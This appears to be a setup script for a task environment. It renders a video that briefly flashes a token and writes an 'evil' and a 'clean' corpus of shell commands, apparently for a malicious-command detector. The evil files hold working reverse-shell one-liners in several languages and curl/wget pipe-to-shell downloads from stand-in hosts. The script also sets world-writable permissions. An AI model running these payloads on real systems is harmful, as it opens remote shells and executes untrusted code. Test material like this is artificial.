#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg fonts-dejavu-core
    pip3 install pytest

    # Create directories
    mkdir -p /app/corpus/evil /app/corpus/clean

    # Generate the video
    echo "TOKEN:A7x9F2mP4vL8qR3w" > /tmp/token.txt
    ffmpeg -y -f lavfi -i color=c=black:s=640x480:r=30:d=10 \
        -vf "drawtext=fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf:textfile=/tmp/token.txt:fontcolor=white:fontsize=36:x=50:y=50:enable='between(t,5,5.33)'" \
        -c:v libx264 -pix_fmt yuv420p /app/capture.mp4
    rm /tmp/token.txt

    # Populate evil corpus
    cat << 'EOF' > /app/corpus/evil/evil1.txt
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84MDgwIDA+JjE=" | base64 -d | sh
EOF

    cat << 'EOF' > /app/corpus/evil/evil2.txt
nc -e /bin/sh 192.168.1.1 4444
EOF

    cat << 'EOF' > /app/corpus/evil/evil3.txt
curl http://malicious.com/payload.sh | bash
EOF

    cat << 'EOF' > /app/corpus/evil/evil4.txt
eval(base64_decode('...'))
EOF

    cat << 'EOF' > /app/corpus/evil/evil5.txt
wget -O- http://10.10.10.10/shell | sh
EOF

    cat << 'EOF' > /app/corpus/evil/evil6.txt
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
EOF

    cat << 'EOF' > /app/corpus/evil/evil7.txt
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
EOF

    cat << 'EOF' > /app/corpus/evil/evil8.txt
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
EOF

    cat << 'EOF' > /app/corpus/evil/evil9.txt
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
EOF

    cat << 'EOF' > /app/corpus/evil/evil10.txt
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
EOF

    # Populate clean corpus
    cat << 'EOF' > /app/corpus/clean/clean1.txt
ls -la /var/log/
EOF

    cat << 'EOF' > /app/corpus/clean/clean2.txt
cat /var/log/syslog | grep error
EOF

    cat << 'EOF' > /app/corpus/clean/clean3.txt
top -b -n 1
EOF

    cat << 'EOF' > /app/corpus/clean/clean4.txt
apt-get update && apt-get upgrade -y
EOF

    cat << 'EOF' > /app/corpus/clean/clean5.txt
df -h
EOF

    cat << 'EOF' > /app/corpus/clean/clean6.txt
free -m
EOF

    cat << 'EOF' > /app/corpus/clean/clean7.txt
tail -f /var/log/nginx/access.log
EOF

    cat << 'EOF' > /app/corpus/clean/clean8.txt
systemctl status sshd
EOF

    cat << 'EOF' > /app/corpus/clean/clean9.txt
ping -c 4 8.8.8.8
EOF

    cat << 'EOF' > /app/corpus/clean/clean10.txt
netstat -tuln
EOF

    # Create user and set permissions
    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
